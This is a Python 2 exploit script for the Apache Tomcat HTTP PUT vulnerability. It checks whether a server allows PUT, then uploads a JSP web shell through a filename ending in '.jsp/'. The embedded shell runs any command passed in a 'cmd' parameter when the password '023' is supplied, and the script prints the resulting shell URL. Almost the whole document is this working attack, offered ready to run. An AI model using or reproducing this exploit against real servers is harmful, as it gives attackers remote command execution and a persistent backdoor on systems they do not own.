import sys
import time
import requests

'''
tomcat put file
'''


def run(url, timeout=5):
    body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
    +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
    try:
        r = requests.options(url + "/ffffzz", verify=False)
        headers = r.headers
        if 'allow' in headers and \
           headers['allow'].find('PUT') > 0:
            # url = "/" + str(int(time.time()))+'.jsp/'
            #url = "/" + str(int(time.time()))+'.jsp::$DATA'
            filename = "/" + str(int(time.time()))+'.jsp/'
            r = requests.put(url + filename, data=body, verify=False)
            if r.status_code == 201:
                # print 'shell:', 'http://' + host + url[:-7]
                print 'shell:', url + filename[:-1]
                return True
            elif r.status_code == 204:
                print 'file exists'
                return True
            else:
                # print 'error'
                pass
            conn.close()

        else:
            print 'Server not vulnerable'

    except Exception as e:
        print e
        pass


if __name__ == '__main__':
    print run('http://127.0.0.1:8080')
